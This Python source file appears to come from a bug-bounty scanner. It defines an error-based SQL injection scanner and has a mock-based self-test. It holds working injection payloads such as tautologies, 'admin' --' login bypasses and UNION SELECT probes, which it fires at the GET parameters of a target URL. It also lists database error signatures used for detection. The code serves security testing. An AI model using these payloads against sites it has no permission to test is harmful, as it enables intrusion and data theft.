import sys
import os
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# Attempt to import CoreEngine and ConfigManager for type hinting and direct use if paths are set
try:
    from core_engine import CoreEngine
    from config_manager import ConfigManager
except ImportError:
    # This allows the script to be parsed, but it will fail at runtime
    # if not called from a context where src is in sys.path (e.g. main_scanner.py)
    # or if the __main__ block's path adjustments are not active.
    CoreEngine = None
    ConfigManager = None


class SQLiScanner:
    """
    Scans URLs for basic error-based SQL injection vulnerabilities in GET parameters.
    """

    SQLI_PAYLOADS = [
        "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1 --",
        "' OR 1=1 #", "' OR 1=1 /*", "admin' --", "admin' #", "admin'/*",
        "UNION SELECT NULL,NULL,NULL--", "' UNION SELECT @@VERSION -- "
        # Add more sophisticated payloads cautiously
    ]

    SQL_ERROR_SIGNATURES = [
        "you have an error in your sql syntax", "warning: mysql", "unclosed quotation mark",
        "sql command not properly ended", "oracle ora-", "microsoft ole db provider for sql server",
        "syntax error near", "incorrect syntax near", "pg_query()", "supplied argument is not a valid postgresql",
        "sqlite3.operationalerror", "include_path" # Common PHP warning that might expose path due to SQLi
    ]

    def __init__(self, core_engine_instance, config_manager_instance):
        """
        Initializes the SQLiScanner.

        Args:
            core_engine_instance (CoreEngine): An instance of the CoreEngine.
            config_manager_instance (ConfigManager): An instance of the ConfigManager.
        """
        if CoreEngine is None or ConfigManager is None:
            # This check helps if the script is imported where src is not yet in path.
            # The __main__ block below handles path adjustment for direct execution.
            raise ImportError("CoreEngine or ConfigManager not imported. Ensure 'src' is in sys.path.")

        if not isinstance(core_engine_instance, CoreEngine):
            raise TypeError("core_engine_instance must be an instance of CoreEngine")
        if not isinstance(config_manager_instance, ConfigManager):
            raise TypeError("config_manager_instance must be an instance of ConfigManager")

        self.engine = core_engine_instance
        self.config = config_manager_instance
        self.user_agent = self.config.get_setting('user_agent', 'AdvancedBountyScanner/0.1 (SQLiModule)')
        self.timeout = self.config.get_setting('timeout', 10)


    def scan_url(self, target_url):
        """
        Scans a given URL for SQL injection vulnerabilities in its GET parameters.

        Args:
            target_url (str): The URL to scan.

        Returns:
            list: A list of dictionaries, where each dictionary represents a potential finding.
                  Returns an empty list if no vulnerabilities are found or if the URL has no parameters.
        """
        potential_findings = []
        parsed_url = urlparse(target_url)
        original_query_params = parse_qs(parsed_url.query, keep_blank_values=True)

        if not original_query_params:
            # print(f"[*] No GET parameters found in {target_url}. Skipping SQLi parameter scan.")
            return potential_findings

        print(f"[*] Scanning URL for SQLi: {target_url}")

        for param_name, param_values in original_query_params.items():
            original_value = param_values[0] if param_values else "" # Take the first value if multiple exist

            for payload in self.SQLI_PAYLOADS:
                # Create a mutable copy of the original query parameters
                test_params = {k: v[:] for k, v in original_query_params.items()} # Deep copy lists

                # Inject payload into the current parameter
                test_params[param_name] = [original_value + payload] # Append payload, or just use payload

                # Reconstruct the query string
                new_query_string = urlencode(test_params, doseq=True)

                # Reconstruct the full URL with the new query string
                # scheme, netloc, path, params (not query params), query, fragment
                test_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, new_query_string, parsed_url.fragment))

                # print(f"  [Testing] {param_name} with payload: {payload} -> {test_url}") # Verbose

                response = self.engine.make_request(
                    test_url,
                    method='GET',
                    headers={'User-Agent': self.user_agent},
                    timeout=self.timeout,
                    allow_redirects=False # Usually better to see direct response for error-based
                )

                if response and response.content: # response.text can be slow if content is large
                    try:
                        response_text = response.content.decode('utf-8', errors='ignore').lower()
                    except AttributeError: # If response.content is None
                        response_text = ""

                    for error_sig in self.SQL_ERROR_SIGNATURES:
                        if error_sig.lower() in response_text:
                            finding = {
                                'url': test_url,
                                'parameter': param_name,
                                'payload': payload,
                                'type': 'error-based',
                                'evidence': error_sig,
                                'response_status': response.status_code,
                                # 'response_excerpt': response_text[:200] # Optional: for more context
                            }
                            potential_findings.append(finding)
                            print(f"  [+] Potential SQLi: Param='{param_name}', Payload='{payload}', Error='{error_sig}'")
                            break # Found one error for this payload, move to next payload

        return potential_findings


if __name__ == '__main__':
    # --- Standalone Testing Setup ---
    # Temporary sys.path adjustment for standalone module testing
    # This allows importing CoreEngine and ConfigManager from the 'src' directory
    current_module_dir = os.path.dirname(os.path.abspath(__file__))
    project_root_dir = os.path.dirname(current_module_dir)  # This should be AdvancedBountyScanner/
    src_dir_path = os.path.join(project_root_dir, 'src')
    if src_dir_path not in sys.path:
        sys.path.insert(0, src_dir_path)

    try:
        from core_engine import CoreEngine
        from config_manager import ConfigManager
    except ImportError as e:
        print(f"[ERROR] Failed to import CoreEngine or ConfigManager for testing: {e}")
        print("Ensure that 'src' directory is correctly added to sys.path if running standalone.")
        sys.exit(1)

    class MockSQLiCoreEngine(CoreEngine):
        """A mock CoreEngine for testing the SQLiScanner without making real HTTP requests."""
        def make_request(self, url, method='GET', headers=None, params=None, data=None, json_payload=None, allow_redirects=True, **kwargs):
            print(f"  [Mock Engine] Requesting: {method} {url}")
            parsed_url_for_mock = urlparse(url)
            query_params_for_mock = parse_qs(parsed_url_for_mock.query)

            class MockResponse:
                def __init__(self, text_content, status_code_val, ok_val):
                    self.text = text_content
                    self.content = text_content.encode('utf-8') # Simulate content
                    self.status_code = status_code_val
                    self.ok = ok_val
                    self.headers = {'Content-Type': 'text/html'}

            # Check if the 'vulnerable_param' contains a payload that triggers a mock SQL error
            if 'vulnerable_param' in query_params_for_mock:
                param_value = query_params_for_mock['vulnerable_param'][0]
                # Simple check for any of the known payloads that might cause an error
                # This mock is simplified; a real server would react to specific parts of the payload.
                if "' OR '1'='1" in param_value or "admin'" in param_value or "'" in param_value:
                    print("  [Mock Engine] Simulated SQL error response for vulnerable_param.")
                    return MockResponse("Syntax error: You have an error in your SQL syntax near ''1'='1'", 200, True)

            # print("  [Mock Engine] Simulated benign response.")
            return MockResponse("<html><body>Normal page content for testing.</body></html>", 200, True)

    print("[*] SQLiScanner Standalone Test Suite")

    # Create dummy config and engine instances
    test_config_manager = ConfigManager() # Uses default internal settings

    # For testing, use the MockSQLiCoreEngine
    test_core_engine = MockSQLiCoreEngine(
        default_headers=test_config_manager.get_setting('headers'),
        timeout=test_config_manager.get_setting('timeout')
    )

    sqli_scanner_instance = SQLiScanner(test_core_engine, test_config_manager)

    print("\n--- Testing SQLi Scanner with a mock vulnerable URL ---")
    test_url_vulnerable = "http://testserver.com/search.php?normal_param=abc&vulnerable_param=test123&another_param=xyz"
    print(f"[*] Scanning vulnerable URL: {test_url_vulnerable}")
    findings_vulnerable = sqli_scanner_instance.scan_url(test_url_vulnerable)

    if findings_vulnerable:
        print("\n[+] SQLi Findings (Mock Vulnerable URL):")
        for finding in findings_vulnerable:
            print(f"  URL: {finding['url']}")
            print(f"  Param: {finding['parameter']}")
            print(f"  Payload: {finding['payload']}")
            print(f"  Type: {finding['type']}")
            print(f"  Evidence: {finding['evidence']}")
            print(f"  Response Status: {finding['response_status']}\n")
    else:
        print("\n[-] No SQLi findings from mock vulnerable scan. This might indicate an issue in test setup or scan logic.")

    print("\n--- Testing SQLi Scanner with a mock non-vulnerable URL ---")
    test_url_non_vulnerable = "http://testserver.com/search.php?normal_param=abc&non_vulnerable_param=test123&another_param=xyz"
    print(f"[*] Scanning non-vulnerable URL: {test_url_non_vulnerable}")
    findings_non_vuln = sqli_scanner_instance.scan_url(test_url_non_vulnerable)
    if not findings_non_vuln:
        print("\n[-] Scan on non-vulnerable URL correctly yielded no findings.")
    else:
        print("\n[!] Scan on non-vulnerable URL yielded findings, check mock or logic:")
        for finding in findings_non_vuln: print(f"  - {finding}")


    print("\n--- Testing SQLi Scanner with a URL with no parameters ---")
    test_url_no_params = "http://testserver.com/index.html"
    print(f"[*] Scanning URL with no params: {test_url_no_params}")
    findings_no_params = sqli_scanner_instance.scan_url(test_url_no_params)
    if not findings_no_params:
        print("\n[-] Scan on URL with no params correctly yielded no findings.")
    else:
        print("\n[!] Scan on URL with no params yielded findings, check logic:")
        for finding in findings_no_params: print(f"  - {finding}")

    print("\n[*] SQLiScanner Standalone Test Suite Finished.")
